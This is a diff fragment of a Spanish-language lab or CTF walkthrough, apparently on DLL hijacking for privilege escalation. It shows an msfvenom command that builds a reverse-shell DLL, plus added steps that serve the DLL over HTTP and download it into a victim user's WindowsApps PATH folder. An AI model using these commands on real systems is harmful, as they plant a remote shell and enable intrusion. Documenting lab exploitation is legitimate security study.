@@ -496,3 +496,18 @@ El siguiente paso, es generar la dll maliciosa con `msfvenom` en nuestra máquin
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.67 LPORT=7777 -f dll > srrstr.dll
 ```
+
+<img width="1656" height="161" alt="image" src="https://github.com/user-attachments/assets/38693f5a-314d-4486-9008-2b1281a21d2e" />
+
+Transferimos la `dll` a la máquina víctima:
+
+```bash
+python3 -m http.server 8080
+```
+
+Descargamos la `dll` en la máquina víctima en el `PATH`:
+```powershell
+curl http://10.10.15.67:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
+```
+
+<img width="1009" height="238" alt="image" src="https://github.com/user-attachments/assets/8e239cb9-a3ff-4425-abc6-b73543bc0ba8" />
